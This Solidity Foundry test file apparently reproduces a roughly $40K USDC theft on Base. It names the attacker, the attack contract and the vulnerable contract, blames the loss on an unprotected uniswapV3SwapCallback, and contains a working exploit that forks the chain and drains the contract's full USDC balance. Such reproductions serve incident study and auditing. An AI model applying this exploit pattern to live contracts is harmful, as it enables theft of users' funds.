// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 40,000 USDC (~$40K)
// Attacker : https://basescan.org/address/0x4efd5f0749b1b91afdcd2ecf464210db733150e0
// Attack Contract : https://basescan.org/address/0x2a59ac31c58327efcbf83cc5a52fae1b24a81440
// Vulnerable Contract : https://basescan.org/address/0x8d2ef0d39a438c3601112ae21701819e13c41288
// Attack Tx : https://basescan.org/tx/0x6be0c4b5414883a933639c136971026977df4737b061f864a4a04e4bd7f07106

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/1958354933247590450
// Root cause : uniswapV3SwapCallback has no access control; positive amount0Delta
// triggers IERC20(token).transfer(recipient, amount) with attacker-chosen data.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IVulnerable {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant VULN = 0x8d2Ef0d39A438C3601112AE21701819E13c41288;

contract BaseCallback0x8d2e is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 34_459_413; // attack 34459414 - 1

    function setUp() public {
        try vm.createSelectFork("http://127.0.0.1:8548", blocknumToForkFrom) {}
        catch {
            vm.createSelectFork("base", blocknumToForkFrom);
        }
        fundingToken = USDC;
    }

    function testExploit() public balanceLog {
        uint256 bal = IERC20(USDC).balanceOf(VULN);
        uint256 before = IERC20(USDC).balanceOf(address(this));
        console.log("Vulnerable USDC balance", bal);
        require(bal > 0, "nothing to drain");

        // data = abi.encode(token, recipient) — live attack encoding
        bytes memory data = abi.encode(USDC, address(this));
        IVulnerable(VULN).uniswapV3SwapCallback(int256(bal), 0, data);

        uint256 got = IERC20(USDC).balanceOf(address(this)) - before;
        console.log("Drained USDC", got);
        assertEq(got, bal, "full drain");
        assertEq(IERC20(USDC).balanceOf(VULN), 0, "vuln emptied");
    }
}
